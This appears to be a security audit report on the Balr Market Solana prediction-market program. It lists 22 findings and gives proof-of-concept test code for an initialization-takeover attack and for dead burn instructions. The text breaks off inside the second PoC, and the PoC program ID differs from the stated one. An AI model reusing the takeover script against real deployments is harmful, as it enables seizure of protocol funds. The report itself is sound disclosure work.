# **Balr-Fun** **Solana Program Final Audit Report**  {#balr-fun-solana-program-final-audit-report}

**[Balr-Fun](#balr-fun-solana-program-final-audit-report)**  
[**Solana Program Final Audit Report	1**](#balr-fun-solana-program-final-audit-report)

[**Project Details	2**](#project-details)

[**Executive Summary	3**](#executive-summary)

[**Scope	4**](#scope)

[**System Overview	5**](#system-overview)

[**Trust Assumptions	7**](#trust-assumptions)

[**Engagement Goals	8**](#engagement-goals)

[**Security Concerns	9**](#security-concerns)

[**Methodology	11**](#methodology)

[**Findings	12**](#findings)

[Critical Severity Issues	14](#critical-severity-issues)

[High Severity Issues	24](#high-severity-issues)

[Medium Severity Issues	32](#medium-severity-issues)

[Low Severity Issues	46](#low-severity-issues)

[**Disclaimer	58**](#disclaimer)

# **Project Details** {#project-details}

Name: Balr Market  
Blockchain: Solana (Mainnet / Devnet)  
Program Name: balr\_market  
Program ID: 5mguM6g2DHXAbK6R7xP3nXG8kdqVnFKgFizYFoE2j9Ld  
Branch: main  
Anchor: 0.31.1 · Framework: Anchor / Rust (stable)  
Initial Commit Hash: 1da4c9b4fd91de92543341a977bb6bdb97b79bc0  
Final Commit Hash: 7f45e1dc88b07532902a047437ad80ea97d4dba9

# **Executive Summary** {#executive-summary}

ImmuneBytes performed a comprehensive security audit of the Balr Market prediction market protocol during April 2026\. The assessment covered the complete single-program Anchor system — all 19 instruction handlers, 8 core account types, and the dual-market-type state machine — as a cohesive on-chain binary prediction market enabling reserve-curve primary trading, Central Limit Order Book secondary trading, admin-gated dispute resolution, and creator fee distribution on Solana.

The protocol demonstrates purposeful architectural design: a two-phase market model that bootstraps liquidity through a deterministic bonding curve before graduating to a price-time-priority CLOB; a bounded creator tilt mechanism that constrains opening prices to a fair band; a bond-backed admin review system providing dispute resolution without requiring oracle dependencies; and an upgrade-authority-less program deployment model consistent with Solana best practices. 

The ImmuneBytes Security Team identified two Critical, two High, eight Medium, and ten Low severity vulnerabilities across the protocol's core fund-flow paths, governance model, and state machine. Chief among these are: an entirely unauthenticated initialization instruction that allows any first caller to seize full admin, relayer, and treasury control of the protocol; a hard-coded BURN\_ADDRESS equal to the Solana System Program's address (Pubkey::default()) that renders both cancel\_primary\_event and burn\_creator\_fees unconditionally unreachable — making the entire fraud-response and fee-burn subsystem dead code; a resolution dispute reward that decrements the live vault balance without updating the snapped primary\_pool\_lamports, systematically overpaying all winning claimants to insolvency; and a graduation gate that requires both YES and NO sides to be non-zero but permits markets to be seeded on one side only — permanently trapping primary deposits with no recovery path.

# **Scope** {#scope}

In Scope

* programs/balr-market-rs/src/lib.rs  
* programs/balr-market-rs/src/states.rs  
* programs/balr-market-rs/src/errors.rs  
* programs/balr-market-rs/src/events.rs  
* programs/balr-market-rs/src/instructions/initialize.rs  
* programs/balr-market-rs/src/instructions/create\_event.rs  
* programs/balr-market-rs/src/instructions/create\_breaking\_event.rs  
* programs/balr-market-rs/src/instructions/graduate\_breaking\_event.rs  
* programs/balr-market-rs/src/instructions/pimary\_order.rs  
* programs/balr-market-rs/src/instructions/secondary\_limit\_order.rs  
* programs/balr-market-rs/src/instructions/secondary\_cancel\_order.rs  
* programs/balr-market-rs/src/instructions/resolve\_event.rs  
* programs/balr-market-rs/src/instructions/dispute\_resolved\_event.rs  
* programs/balr-market-rs/src/instructions/settle\_resolution\_dispute.rs  
* programs/balr-market-rs/src/instructions/report\_primary\_event.rs  
* programs/balr-market-rs/src/instructions/approve\_primary\_event.rs  
* programs/balr-market-rs/src/instructions/cancel\_primary\_event.rs  
* programs/balr-market-rs/src/instructions/claim\_win.rs  
* programs/balr-market-rs/src/instructions/claim\_lamports.rs  
* programs/balr-market-rs/src/instructions/claim\_creator\_fees.rs  
* programs/balr-market-rs/src/instructions/burn\_creator\_fees.rs  
* programs/balr-market-rs/src/instructions/update\_config.rs  
* programs/balr-market-rs/src/instructions/get\_event\_pool\_total.rs

Out of Scope

* tests/ — integration test suite  
* scripts/ — deployment and keeper scripts  
* client/ — TypeScript SDK and CLI  
* idl/ and target/ — generated build artifacts  
* Off-chain backend systems assumed to be trusted and centrally controlled  
* Keeper infrastructure (auto\_graduate\_breaking.ts) and associated operational tooling

# **System Overview** {#system-overview}

Balr Market is a hybrid on-chain prediction market protocol on Solana that supports binary outcome events (YES / NO) through two sequential trading phases and two distinct market creation modes.

Architecture

The system is composed of a single Anchor program with 19 publicly callable instructions organized around eight core account types. MarketConfig is a singleton PDA seeded by "market\_config" that stores all global governance parameters: the three-member admin key array, relayer address, treasury address, primary and secondary fee basis points, graduation threshold, tick size, max traversal per transaction, and neutral liquidity depth. Every privileged instruction validates callers against this singleton, making it the singular root of trust whose compromise affects the entire protocol simultaneously. Event is the per-market state account tracking the full lifecycle, timing fields, outcome flags, virtual reserves, share totals, and the post-graduation primary\_pool\_lamports snapshot. Vault holds and accounts for the actual SOL escrow per market, with a tracked lamport field that must remain synchronized with the account's real lamport balance — a dual-tracking invariant that must be preserved manually across all instruction paths. CreatorFeeVault accumulates the creator's 20% fee share until claim or admin burn. ReviewRequest is an ephemeral PDA that escrows one active bond per event and captures dispute metadata. UserPosition stores per-user per-market share balances and realized lamport profits. PriceLevel and OrderNode form the on-chain CLOB order book structure.

Market Lifecycle

A protocol operator calls initialize once to configure MarketConfig. Market creators call create\_event (standard) or create\_breaking\_event (time-compressed) with a 1 SOL creation fee and a seed deposit of 0.5–0.9 SOL, which initializes the bonding curve's virtual reserves with a creator-tilted opening price. Users trade YES/NO shares via primary\_order using a constant-sum bonding curve formula that mints shares from reserve movement. Standard markets auto-graduate to secondary CLOB trading when vault.lamport \>= graduation\_threshold and both YES and NO sides have non-zero share supply. Breaking markets graduate when flash\_acquisition\_end passes. Once graduated, users place resting limit orders via secondary\_limit\_order against remaining\_accounts-supplied OrderNode PDAs. The relayer or an admin calls resolve\_event after the market's resolution time to set the final yes\_wins outcome. Winning claimants call claim\_winnings for a pro-rata payout from primary\_pool\_lamports; CLOB profit holders call claim\_lamports. Disputed resolutions are handled by dispute\_resolved\_event and settle\_resolution\_dispute under a bond-backed admin review flow. If a market is reported fraudulent during the primary phase, cancel\_primary\_event is supposed to burn all vault SOL; if a market fails to graduate, burn\_creator\_fees is supposed to burn accrued creator fees.

Key Implementation Details

The bonding curve uses a constant-sum formulation: for a YES buy paying L lamports, shares minted \= floor(sqrt(X² \+ 2DL)) \- X where X \= virtual\_sol\_reserves and D \= X \+ Y. Secondary execution cost is price\_lamports × match\_amount / 10⁹. The fee model routes 80% of all fees to treasury and 20% to the CreatorFeeVault. The primary\_pool\_lamports snapshot is captured at graduation and used as the authoritative basis for winner payouts and dispute reward math — its integrity is critical to solvency. The CLOB matching engine validates order ownership through remaining\_accounts but does not enforce strict time-priority for taker-selected fill ordering. ReviewRequest blocks all primary actions and winnings claims while pending, creating a denial-of-service surface for the review initiator.

# **Trust Assumptions** {#trust-assumptions}

* The program upgrade authority is fully trusted and treated as the ultimate protocol owner; findings requiring its malicious exercise are outside scope.  
* The three-member admin set is collectively trusted for governance actions (config updates, review finalization, dispute settlement); findings arising from a compromised single admin are in scope given the absent quorum enforcement.  
* The relayer is trusted for resolution authority in the same manner as an admin; its key compromise is treated as an in-scope trust surface given no on-chain binding to the deployer identity.  
* Market creators are semi-trusted; they pay a creation fee and control market framing but cannot directly influence resolution outcomes on-chain.  
* Users (traders, order placers, claimants) hold no privileged role and are treated as fully adversarial actors in all protocol interactions.  
* The off-chain backend supplying dispute outcomes and resolution calls is trusted for intent; on-chain, only key authorization is enforced.  
* No external price oracle dependency exists; all price discovery is on-chain through the bonding curve and CLOB mechanics.  
* The Solana runtime and Anchor framework are trusted as correct; vulnerabilities in the runtime or framework are outside scope.

# **Engagement Goals** {#engagement-goals}

1. Given that initialize is the sole governance bootstrapping instruction, what actually prevents any observer from front-running deployment and seizing full protocol control — and does the protocol have any on-chain recovery path if this happens?  
2. The three-member admin array is intended as a quorum — does any single admin key have the ability to unilaterally override the entire set in one transaction, and what does this imply for the stated governance model?  
3. The primary\_pool\_lamports snapshot is the economic foundation for all winner payouts and dispute rewards — is it ever decremented after capture, and does any instruction debit the live vault without updating this snapshot?  
4. Graduation requires both YES and NO sides to be non-zero, but markets can be seeded on one side only — is there any on-chain path to recover primary deposits from a market that can never graduate?  
5. Both burn instructions (cancel\_primary\_event, burn\_creator\_fees) are described as fraud-response mechanisms — do they execute correctly, or does the BURN\_ADDRESS choice silently make them dead code?  
6. The graduation threshold is a mutable admin parameter — can it be raised retroactively to strand markets that were already eligible, and what happens to their primary deposits?  
7. The dispute bond system is supposed to deter frivolous disputes while rewarding legitimate ones — is there a sequence where the reward payment creates insolvency, and can the review freeze be used as a griefing tool?  
8. Non-graduated standard markets have no described refund path — is user capital permanently locked if a market fails to hit the graduation threshold, or is there an on-chain recovery mechanism?  
9. The CLOB fill order is taker-supplied via remaining\_accounts — does this constitute a time-priority violation, and what economic advantage does the taker extract by cherry-picking which resting orders to fill?  
10. Does the secondary market accounting correctly attribute all fees to the fee distribution model, or do secondary fees bypass the protocol's accounting entirely?  
11. Can the report-freeze mechanism be weaponized as a denial-of-service attack on a live market, and what is the cost and reversibility of such an attack?  
12. Are there fund-locking paths reachable through normal user interaction — direct PDA SOL transfers, zero-amount orders, or one-sided market creation — that permanently remove capital with no recovery mechanism?

# **Security Concerns** {#security-concerns}

Protocol initialization and governance

The initialize instruction creates the singleton MarketConfig PDA that governs the entire protocol — all admin keys, the relayer, the treasury, and every fee and threshold parameter. No constraint binds the signer to the program's upgrade authority or any pre-committed deployer key. Since Anchor's init constraint prevents re-initialization, the first wallet to call initialize after deployment permanently owns the protocol. Separately, update\_config replaces the entire admin array from a single admin signer with no quorum check, allowing any one compromised or malicious admin key to lock out the other two in a single transaction.

Burn address and admin fraud-response subsystem

BURN\_ADDRESS is defined as anchor\_lang::solana\_program::pubkey\!("11111111111111111111111111111111") — the all-zeros public key, which is the Solana System Program address. Both cancel\_primary\_event and burn\_creator\_fees declare this account as \#\[account(mut)\]. The Solana runtime unconditionally rejects attempts to mark the system program account as writable. Both instructions fail before their handler bodies execute with ConstraintMut error 2000\. The entire admin fraud-response pipeline — the only on-chain path to act on a confirmed fraudulent market — is dead code. Creator fee vault funds from failed markets are permanently stranded.

Dispute reward and pool snapshot integrity

settle\_resolution\_dispute pays an upheld disputer a reward of 0.5% × primary\_pool\_lamports by decrementing vault.lamport but not event.primary\_pool\_lamports. The snapshot remains inflated by the paid reward amount. All subsequent claim\_winnings calls divide against the original (larger) pool, collectively overpaying winners by more than the vault contains. The vault reaches insolvency before all legitimate winners can claim. The vulnerability is compounded by the "early claim amplifies shortfall" pattern: users who claim before the pool is exhausted receive full overpayment, while late claimants receive nothing.

Graduation and primary fund lockup

Standard market graduation requires both total\_yes\_shares \>= 1 and total\_no\_shares \>= 1, but create\_event seeds only one side — the creator's chosen direction. A market seeded entirely on YES has zero NO shares and can never satisfy the dual-side graduation condition regardless of subsequent primary trading. All deposited SOL is permanently locked in the vault: no refund instruction exists, burn\_creator\_fees is dead, and cancel\_primary\_event is dead. The same fund-lockup is reachable through retroactive graduation\_threshold increases and through the time-delayed report-freeze path for markets where a report suspends primary trading until resolution time passes without admin action.

CLOB integrity and order book manipulation

The secondary CLOB matching engine accepts resting orders to fill as caller-supplied remaining\_accounts without enforcing time-priority across the candidate set. A taker can select which resting orders to fill within a price level, choosing the most advantageous fills and bypassing older resting orders. The OrderNode PDA seeds include a caller-supplied order\_id, creating a predictable seed surface that enables order-slot squatting ahead of a known incoming order. Zero-amount order nodes are never pruned, allowing a dormant order to be re-encountered by future matching passes and causing premature loop termination.

Fee accounting and direct fund stranding

Secondary market fees are routed through execution logic but are not reflected in Event.total\_revenue or any on-chain aggregate tracking field, making secondary fee accounting opaque and unverifiable from protocol state. Any SOL transferred directly to a Vault or CreatorFeeVault PDA outside of the program's instruction flow increases the account's real lamport balance without updating the tracked vault.lamport field — the excess is permanently stranded with no sweep or rescue mechanism. The same stranding applies to any SOL donated to any other protocol PDA.

# **Methodology** {#methodology}

This audit was conducted through manual line-by-line review of all in-scope instruction handlers, account structs, and supporting modules, with particular focus on fund-flow correctness, account validation completeness, state machine reachability, and arithmetic precision. 

The review was structured across six analytical phases: 

1. a threat landscape phase examining the primary market, secondary CLOB, and oracle/resolution attack surfaces;   
2. an economic game theory phase analyzing pool insolvency chains, bond system incentive alignment, and graduation economics;   
3. a Solana systems phase covering PDA substitution gaps, remaining\_accounts trust surfaces, and the dual lamport-tracking invariant;   
4. a state machine phase mapping lifecycle reachability and terminal states;   
5. an admin trust phase analyzing privileged action abuse and governance centralization; and   
6. a cross-cutting phase verifying fee accounting invariants and spec-versus-implementation divergences. 

Material findings were verified with a dedicated proof-of-concept suite compiled against the deployed balr\_market.sol binary, covering C-01 through C-02, H-01 through H-02, M-01 through M-05, and L-01 through L-03. 

## 

## 

# **Findings** {#findings}

| ID | Title | Severity | Status |
| :---- | :---- | :---- | :---: |
| 1 | Unauthenticated Protocol Initialization | **Critical** | **FIXED** |
| 2 | Inoperative Administrative Burn Mechanism | **Critical** | **FIXED** |
| 3 | Unbound Vault Enables Underpriced Market Freeze | **High** | **FIXED** |
| 4 | Stale Prize Pool Snapshot Causes Winner Payout Insolvency | **High** | **FIXED** |
| 5 | Insufficient Admin Quorum for Governance Mutations | **Medium** | **FIXED** |
| 6 | Retroactive Graduation Threshold Change Locks Live Markets | **Medium** | **FIXED** |
| 7 | Absent Refund Path for Non-Graduated Primary Deposits | **Medium** | **FIXED**  |
| 8 | Time-Delayed Report Freeze Converts to Permanent Fund Lockup | **Medium** | **FIXED** |
| 9 | One-Sided Breaking Market Graduation Locks Primary Pool | **Medium** | **FIXED** |
| 10 | Admin Cancel Destroys User Deposits Without Recourse | **Medium** | **FIXED** |
| 11 | Unbounded Review Duration Enables Indefinite Market Freeze | **Medium** | **FIXED** |
| 12 | Early Claim Sequence Amplifies Dispute Shortfall | **Medium** | **FIXED** |
| 13 | Taker-Controlled Fill Order Violates CLOB Time Priority | **Low** | **FIXED** |
| 14 | Fully-Filled Order Rent Permanently Stranded | **Low** | **FIXED** |
| 15 | Integer Truncation Enables Zero-Cost Share Acquisition | **Low** | **FIXED** |
| 16 | Missing Review Guard on Secondary Profit Withdrawal | **Low** | **FIXED** |
| 17 | Predictable Order ID Enables Queue Front-Running | **Low** | **FIXED** |
| 18 | Absent Balance Parity Condition Permits Lopsided Graduation | **Low** | **FIXED** |
| 19 | Undisclosed Admin Resolution Authority Understates Trust Surface | **Low** | **FIXED** |
| 20 | Secondary Market Fees Excluded from Protocol Accounting | **Low** | **FIXED** |
| 21 | Zero-Amount Order Node Causes Premature Matching Loop Exit | **Low** | **FIXED** |
| 22 | Direct PDA Donations Permanently Strand SOL | **Low** | **FIXED** |

## 

## **Critical Severity Issues** {#critical-severity-issues}

1. **Unauthenticated Protocol Initialization**  
   **Severity:** Critical  
   **File:** `programs/balr-market-rs/src/instructions/initialize.rs` (lines 111–128)  
   **Status:** **FIXED**

   **Description:**  
   The `initialize` instruction creates the singleton `MarketConfig` PDA that governs the entire protocol — setting all admin keys, the oracle address, the treasury wallet, and every fee and threshold parameter. Because Anchor's `init` constraint prevents double-initialization, the protocol's entire governance structure is determined by the **first** wallet that calls this instruction after the program is deployed.  
   The accounts struct places no constraint binding the signer to the program's upgrade authority or any pre-committed deployer key:  
   *// initialize.rs — any signer wins the first-caller race*  
   pub struct Initialize\<'info\> {  
       \#\[account(init, payer \= admin, space \= ..., seeds \= \[b"market\_config"\], bump)\]  
       pub market\_config: Account\<'info, MarketConfig\>,  
       \#\[account(mut)\]  
       pub admin: Signer\<'info\>,   *// ← no address \= DEPLOYER\_PUBKEY constraint*  
       pub system\_program: Program\<'info, System\>,  
   }  
     
   On Solana, `anchor deploy` and the subsequent `initialize` call are separate transactions. A bot monitoring the chain for newly deployed programs can detect the deployment and front-run the team's `initialize` call, inserting its own public keys into every privileged slot.  
   **Impact:**  
   An attacker who wins the initialization race immediately becomes the sole admin, oracle, and treasury beneficiary of the entire protocol. All future creation fees (1 SOL per market) flow to the attacker's treasury. All future primary and secondary trading fees (80% of every fee split) route to the attacker's wallet. The attacker's relayer key can resolve any market to any outcome, directing prize pools to Sybil-controlled wallets. The attack is one-transaction and irreversible — once `market_config` is initialized, the legitimate team has no on-chain path to reclaim control. For a protocol with 1,000 markets averaging 100 SOL in trading volume, the extractable value exceeds 1,000 SOL in creation fees plus all fee revenue plus arbitrarily resolved prize pools.  
   **Proof of Concept:**

|  import \* as anchor from "@coral-xyz/anchor"; import { BN, Program } from "@coral-xyz/anchor"; import { Keypair, PublicKey, LAMPORTS\_PER\_SOL } from "@solana/web3.js"; import { startAnchor, BankrunProvider } from "anchor-bankrun"; import { assert } from "chai"; import \* as fs from "fs"; import \* as path from "path"; const PROGRAM\_ID \= new PublicKey("BeC6CD5Y3PW6QtqVFBf1R1JLdw84QM7N4jqytBzxoPg4"); const IDL \= JSON.parse(   fs.readFileSync(path.join(\_\_dirname, "../../target/idl/balr\_market.json"), "utf-8") ); describe("C-01 PoC — Unauthenticated initialize", () \=\> {   it("An anonymous attacker keypair can call initialize and take full admin control", async () \=\> {     const context \= await startAnchor(path.join(\_\_dirname, "../.."), \[\], \[\]);     const provider \= new BankrunProvider(context);     anchor.setProvider(provider);     const program \= new Program(IDL as anchor.Idl, provider) as any;     const attacker \= Keypair.generate();     const ix \= anchor.web3.SystemProgram.transfer({       fromPubkey: context.payer.publicKey,       toPubkey: attacker.publicKey,       lamports: 2 \* LAMPORTS\_PER\_SOL,     });     const tx \= new anchor.web3.Transaction().add(ix);     tx.recentBlockhash \= context.lastBlockhash;     tx.feePayer \= context.payer.publicKey;     tx.sign(context.payer);     await context.banksClient.processTransaction(tx);     const \[marketConfigPda\] \= PublicKey.findProgramAddressSync(       \[Buffer.from("market\_config")\], PROGRAM\_ID     );     assert.isNull(await context.banksClient.getAccount(marketConfigPda));     await program.methods       .initialize(         \[attacker.publicKey, attacker.publicKey, attacker.publicKey\],         attacker.publicKey,         attacker.publicKey,         new BN(LAMPORTS\_PER\_SOL),         new BN(0),         new BN(200),         new BN(150),         new BN(6 \* LAMPORTS\_PER\_SOL),         new BN(1\_000\_000),         20,         new BN(2 \* LAMPORTS\_PER\_SOL)       )       .accounts({ admin: attacker.publicKey })       .signers(\[attacker\])       .rpc();     const config \= await program.account.marketConfig.fetch(marketConfigPda);     for (const a of config.admin as PublicKey\[\])       assert.strictEqual(a.toBase58(), attacker.publicKey.toBase58());     assert.strictEqual((config.relayer as PublicKey).toBase58(), attacker.publicKey.toBase58());     assert.strictEqual((config.treasury as PublicKey).toBase58(), attacker.publicKey.toBase58());   }); }); |
| :---- |

   

   **Result:**

   \[C-01 CONFIRMED\] Attacker is now admin \+ relayer \+ treasury.

   → All future creation\_fees flow to attacker wallet.

   → All future primary/secondary fees (80% split) flow to attacker wallet.

   → Attacker can resolve any event in Sybil-favorable ways.

     ✔ (74ms)

   **Recommendation**

   **Short term:** Bind the `admin` signer in `Initialize` to the program's upgrade authority by adding a `ProgramData` account constraint that requires `program_data.upgrade_authority_address == Some(admin.key())`.

   **Long term:** Atomically execute `anchor deploy` and `initialize` in a single scripted pipeline so no block window exists between program deployment and governance initialization.

2. **Inoperative Administrative Burn Mechanism**  
   **Severity:** Critical  
   **Files:** `programs/balr-market-rs/src/states.rs` (lines 56–57), `instructions/cancel_primary_event.rs` (line 117), `instructions/burn_creator_fees.rs` (line 88\)  
   **Status:** **FIXED**  
   **Description:**  
   The protocol defines `BURN_ADDRESS` as the destination for funds from cancelled fraudulent markets and failed creator fee vaults:  
   *// states.rs*  
   pub const BURN\_ADDRESS: Pubkey \=  
       anchor\_lang::solana\_program::pubkey\!("11111111111111111111111111111111");  
     
   The base-58 string `"11111111111111111111111111111111"` (32 ones) decodes to the all-zero 32-byte public key — which **is the Solana System Program's address** (`SystemProgram::ID`). Both burn instructions declare this account as mutable:  
   \#\[account(mut, address \= BURN\_ADDRESS)\]  
   pub burn\_address: UncheckedAccount\<'info\>,  
     
   The Solana runtime enforces that the system program account is never writable. Anchor's account validation fires this check before the instruction handler body executes. Every call to `cancel_primary_event` and `burn_creator_fees` fails unconditionally with `ConstraintMut` error 2000\. Both instructions are dead code. The in-source comment erroneously describes this as "the standard burn address pattern" — the actual convention uses a well-known off-curve address with no recoverable private key, not the system program.  
   **Impact:**  
   The admin fraud-response pipeline is completely non-functional. When an invalidity report is filed, the two admin responses are `approve_primary_event` (clears the report) and `cancel_primary_event` (confirms the market as fraudulent). Since `cancel_primary_event` always reverts, there is no on-chain path for admins to act on a confirmed fraudulent market — the only non-reverting option incorrectly signals the report was false. `burn_creator_fees` is equally dead: creator fee revenue from any non-graduated market is permanently stranded in `CreatorFeeVault` with no recovery path. Additionally, when developers fix `BURN_ADDRESS` to a valid address, the corrected `cancel_primary_event` will burn the entire vault balance including all user primary deposits — a latent critical risk that activates upon remediation unless M-06 is addressed simultaneously.  
   **Proof of Concept — `cancel_primary_event` is dead**

|  import \* as anchor from "@coral-xyz/anchor"; import { BN, Program } from "@coral-xyz/anchor"; import { Keypair, PublicKey, LAMPORTS\_PER\_SOL } from "@solana/web3.js"; import { startAnchor, BankrunProvider } from "anchor-bankrun"; import { sha256 } from "js-sha256"; import { assert } from "chai"; import \* as fs from "fs"; import \* as path from "path"; const PROGRAM\_ID \= new PublicKey("BeC6CD5Y3PW6QtqVFBf1R1JLdw84QM7N4jqytBzxoPg4"); const IDL \= JSON.parse(fs.readFileSync(   path.join(\_\_dirname, "../../target/idl/balr\_market.json"), "utf-8")); const BURN\_ADDRESS \= PublicKey.default; const hashQuestion \= (q: string) \=\> Buffer.from(sha256.array(Buffer.from(q, "utf-8"))); async function fund(ctx: any, to: PublicKey, lamports: number) {   const ix \= anchor.web3.SystemProgram.transfer({ fromPubkey: ctx.payer.publicKey, toPubkey: to, lamports });   const tx \= new anchor.web3.Transaction().add(ix);   tx.recentBlockhash \= ctx.lastBlockhash;   tx.feePayer \= ctx.payer.publicKey;   tx.sign(ctx.payer);   await ctx.banksClient.processTransaction(tx); } describe("C-02a — cancel\_primary\_event reverts (BURN\_ADDRESS \= system program)", () \=\> {   it("every call fails with ConstraintMut on burn\_address", async () \=\> {     const context \= await startAnchor(path.join(\_\_dirname, "../.."), \[\], \[\]);     const provider \= new BankrunProvider(context);     anchor.setProvider(provider);     const program \= new Program(IDL as anchor.Idl, provider) as any;     const \[admin, treasury, relayer, creator, alice, reporter\] \=       Array.from({ length: 6 }, () \=\> Keypair.generate());     for (const k of \[admin, creator, alice, reporter\])       await fund(context, k.publicKey, 5 \* LAMPORTS\_PER\_SOL);     await program.methods.initialize(       \[admin.publicKey, admin.publicKey, admin.publicKey\],       relayer.publicKey, treasury.publicKey,       new BN(LAMPORTS\_PER\_SOL), new BN(0), new BN(200), new BN(150),       new BN(6 \* LAMPORTS\_PER\_SOL), new BN(1\_000\_000), 20,       new BN(2 \* LAMPORTS\_PER\_SOL),     ).accounts({ admin: admin.publicKey }).signers(\[admin\]).rpc();     const question \= "cancel reverts";     const qHash \= hashQuestion(question);     const now \= Math.floor(Date.now() / 1000);     const startTime \= now \+ 7 \* 24 \* 3600;     const \[marketConfigPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("market\_config")\], PROGRAM\_ID);     const \[eventPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("event"), creator.publicKey.toBuffer(), qHash\], PROGRAM\_ID);     const \[vaultPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("vault"), creator.publicKey.toBuffer(), qHash\], PROGRAM\_ID);     const \[creatorFeeVaultPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("creator\_fee\_vault"), eventPda.toBuffer()\], PROGRAM\_ID);     const \[creatorPositionPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("position"), eventPda.toBuffer(), creator.publicKey.toBuffer()\], PROGRAM\_ID);     const \[alicePosPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("position"), eventPda.toBuffer(), alice.publicKey.toBuffer()\], PROGRAM\_ID);     const \[reviewPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("review\_request"), eventPda.toBuffer()\], PROGRAM\_ID);     await program.methods.createEvent(       new BN(startTime), new BN(startTime \+ 86400), new BN(startTime \+ 90000),       question, new BN(0.5 \* LAMPORTS\_PER\_SOL), true, "", \[\],     ).accountsPartial({       creator: creator.publicKey, marketConfig: marketConfigPda,       event: eventPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda,       creatorPosition: creatorPositionPda, treasury: treasury.publicKey,     }).signers(\[creator\]).rpc();     await program.methods.primaryOrder({ yes: {} }, new BN(0.4 \* LAMPORTS\_PER\_SOL))       .accountsPartial({         user: alice.publicKey, marketConfig: marketConfigPda,         event: eventPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda,         userPosition: alicePosPda, treasury: treasury.publicKey,       }).signers(\[alice\]).rpc();     await program.methods.reportPrimaryEvent().accountsPartial({       reporter: reporter.publicKey, event: eventPda, vault: vaultPda, reviewRequest: reviewPda,     }).signers(\[reporter\]).rpc();     let cancelError: any \= null;     try {       await program.methods.cancelPrimaryEvent().accountsPartial({         admin: admin.publicKey, marketConfig: marketConfigPda,         event: eventPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda,         reviewRequest: reviewPda, requester: reporter.publicKey,         treasury: treasury.publicKey,       }).signers(\[admin\]).rpc();     } catch (err) { cancelError \= err; }     assert.match(String(cancelError), /ConstraintMut/);   }); }); |
| :---- |

   

   **Result:**

   Cancel error: AnchorError caused by account: burn\_address.

     Error Code: ConstraintMut. Error Number: 2000\.

   Post-cancel: vault has 0.90105792 SOL, burn addr delta \= 0 SOL

   \[C-02a CONFIRMED\] cancel\_primary\_event unreachable — system program cannot be writable.

**Proof of Concept — `burn_creator_fees` is dead**

| import \* as anchor from "@coral-xyz/anchor"; import { BN, Program } from "@coral-xyz/anchor"; import { Keypair, PublicKey, LAMPORTS\_PER\_SOL } from "@solana/web3.js"; import { startAnchor, BankrunProvider } from "anchor-bankrun"; import { sha256 } from "js-sha256"; import { assert } from "chai"; import \* as fs from "fs"; import \* as path from "path"; const PROGRAM\_ID \= new PublicKey("BeC6CD5Y3PW6QtqVFBf1R1JLdw84QM7N4jqytBzxoPg4"); const IDL \= JSON.parse(fs.readFileSync(   path.join(\_\_dirname, "../../target/idl/balr\_market.json"), "utf-8")); const hashQuestion \= (q: string) \=\> Buffer.from(sha256.array(Buffer.from(q, "utf-8"))); async function fund(ctx: any, to: PublicKey, lamports: number) {   const ix \= anchor.web3.SystemProgram.transfer({ fromPubkey: ctx.payer.publicKey, toPubkey: to, lamports });   const tx \= new anchor.web3.Transaction().add(ix);   tx.recentBlockhash \= ctx.lastBlockhash;   tx.feePayer \= ctx.payer.publicKey;   tx.sign(ctx.payer);   await ctx.banksClient.processTransaction(tx); } async function warpTo(ctx: any, unixTs: number) {   const clock \= await ctx.banksClient.getClock();   ctx.setClock(new (clock as any).constructor(     clock.slot, clock.epochStartTimestamp, clock.epoch,     clock.leaderScheduleEpoch, BigInt(unixTs))); } describe("C-02b — burn\_creator\_fees reverts (same root cause)", () \=\> {   it("burn\_creator\_fees on a failed market fails with ConstraintMut", async () \=\> {     const context \= await startAnchor(path.join(\_\_dirname, "../.."), \[\], \[\]);     const provider \= new BankrunProvider(context);     anchor.setProvider(provider);     const program \= new Program(IDL as anchor.Idl, provider) as any;     const \[admin, treasury, relayer, creator, alice\] \=       Array.from({ length: 5 }, () \=\> Keypair.generate());     for (const k of \[admin, creator, alice\])       await fund(context, k.publicKey, 5 \* LAMPORTS\_PER\_SOL);     await program.methods.initialize(       \[admin.publicKey, admin.publicKey, admin.publicKey\],       relayer.publicKey, treasury.publicKey,       new BN(LAMPORTS\_PER\_SOL), new BN(0), new BN(200), new BN(150),       new BN(6 \* LAMPORTS\_PER\_SOL), new BN(1\_000\_000), 20,       new BN(2 \* LAMPORTS\_PER\_SOL),     ).accounts({ admin: admin.publicKey }).signers(\[admin\]).rpc();     const clock \= await context.banksClient.getClock();     const startTime \= Number(clock.unixTimestamp) \+ 120;     const question \= "burn\_creator\_fees dead";     const qHash \= hashQuestion(question);     const \[marketConfigPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("market\_config")\], PROGRAM\_ID);     const \[eventPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("event"), creator.publicKey.toBuffer(), qHash\], PROGRAM\_ID);     const \[vaultPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("vault"), creator.publicKey.toBuffer(), qHash\], PROGRAM\_ID);     const \[creatorFeeVaultPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("creator\_fee\_vault"), eventPda.toBuffer()\], PROGRAM\_ID);     const \[creatorPositionPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("position"), eventPda.toBuffer(), creator.publicKey.toBuffer()\], PROGRAM\_ID);     const \[alicePosPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("position"), eventPda.toBuffer(), alice.publicKey.toBuffer()\], PROGRAM\_ID);     await program.methods.createEvent(       new BN(startTime), new BN(startTime \+ 300), new BN(startTime \+ 360),       question, new BN(0.5 \* LAMPORTS\_PER\_SOL), true, "", \[\],     ).accountsPartial({       creator: creator.publicKey, marketConfig: marketConfigPda,       event: eventPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda,       creatorPosition: creatorPositionPda, treasury: treasury.publicKey,     }).signers(\[creator\]).rpc();     await program.methods.primaryOrder({ yes: {} }, new BN(0.2 \* LAMPORTS\_PER\_SOL))       .accountsPartial({         user: alice.publicKey, marketConfig: marketConfigPda,         event: eventPda, vault: vaultPda, 